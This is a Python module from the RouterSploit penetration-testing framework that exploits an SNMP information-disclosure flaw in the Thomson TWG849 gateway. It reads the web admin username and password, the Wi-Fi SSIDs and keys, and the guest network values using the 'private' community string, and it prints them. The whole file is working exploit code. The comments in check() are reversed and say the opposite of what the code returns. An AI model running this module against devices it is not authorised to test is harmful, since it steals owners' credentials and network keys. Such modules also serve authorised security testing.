from routersploit.core.exploit import *
from routersploit.core.snmp.snmp_client import SNMPClient


class Exploit(SNMPClient):
    __info__ = {
        "name": "Thomson TWG849 Info Disclosure",
        "description": "Module exploits Thomson TWG849 information disclosure vulnerability which allows reading sensitive information.",
        "authors": (
            "Sebastian Perez",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://packetstormsecurity.com/files/133631/Thomson-CableHome-Gateway-DWG849-Information-Disclosure.html",
        ),
        "devices": (
            "Thomson TWG849",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(161, "Target SNMP port")

    verbosity = OptBool(False, "Enable verbose output: true/false")

    def __init__(self):
        self.oids = {
            # make, model, software version
            "model": "1.3.6.1.2.1.1.1.0",
            "uptime": "1.3.6.1.2.1.1.3.0",

            # web interface credentials
            "username": "1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0",
            "password": "1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0",

            # ssid and key
            "ssid1": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.32",
            "ssid2": "1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.2.32",

            # guest network oids
            "guest1": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.33",
            "guest2": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.34",
            "guest3": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.35",
        }

    def run(self):
        res = []

        print_status("Reading parameters...")
        for name in self.oids.keys():
            snmp_client = self.snmp_create()
            snmp = snmp_client.get("private", self.oids[name])
            if snmp:
                value = str(snmp[0][1])

                if value:
                    res.append((name, value))

        if res:
            print_success("Exploit success")
            print_table(("Parameter", "Value"), *res)
        else:
            print_error("Exploit failed - could not read sensitive information")

    @mute
    def check(self):
        snmp_client = self.snmp_create()
        snmp = snmp_client.get("private", "1.3.6.1.2.1.1.1.0")
        if snmp:
            return True  # target is not vulnerable

        return False  # target is vulnerable
